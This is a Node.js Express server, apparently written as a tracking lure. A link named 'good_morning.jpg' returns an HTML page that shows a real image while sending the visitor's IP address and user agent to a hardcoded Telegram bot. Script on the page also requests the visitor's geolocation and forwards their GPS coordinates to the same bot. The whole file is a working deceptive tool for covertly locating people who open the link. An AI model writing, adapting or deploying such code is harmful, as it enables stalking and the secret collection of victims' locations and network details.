import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
const CHAT_ID = "7485197107";

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

// رابط وهمي اسمه .jpg لكنه HTML
app.get("/good_morning.jpg", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"];
  await sendToTelegram(`📸 فتح الصورة:\nIP: ${ip}\nUA: ${ua}`);

  res.set("Content-Type", "text/html"); // مهم: يرجّع HTML رغم الامتداد jpg
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><title></title></head>
    <body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#000;">
      <img src="/real_good_morning.jpg" style="max-width:100%;height:auto;" alt="صباح الخير">
      <script>
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
          });
        }
      </script>
    </body>
    </html>
  `);
});

// استقبال GPS
app.get("/log", async (req, res) => {
  const { lat, lon } = req.query;
  if (lat && lon) {
    await sendToTelegram(\`📍 GPS:\nLat: \${lat}\nLon: \${lon}\`);
  }
  res.send("");
});

// الصورة الحقيقية
app.get("/real_good_morning.jpg", (req, res) => {
  res.sendFile(process.cwd() + "/good_morning.jpg");
});

app.listen(PORT, () => console.log("✅ Running on " + PORT));
